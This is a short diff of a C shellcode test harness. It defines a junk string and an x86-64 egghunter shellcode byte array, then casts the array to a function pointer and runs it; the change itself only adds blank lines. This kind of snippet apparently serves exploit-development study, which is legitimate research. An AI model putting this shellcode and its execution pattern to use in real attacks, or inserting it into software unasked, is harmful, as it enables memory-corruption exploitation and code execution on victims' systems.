@@ -13,6 +13,8 @@ main(void)
         char trash[] = "ASFHA(USFHAIFJA)FH(*HAFIONIJ)*Y(&UNMIOPJHOHOIN:IUASD";
         char egghunter[] = "\x48\x83\xc4\x16\x48\xff\xc4\x81\x3c\x24\x41\x41\x41\x41\x75\xf4\x48\x83\xc4\x04\xff\xe4";
 
+
+
         (*(void(*)()) egghunter)();
 
 }
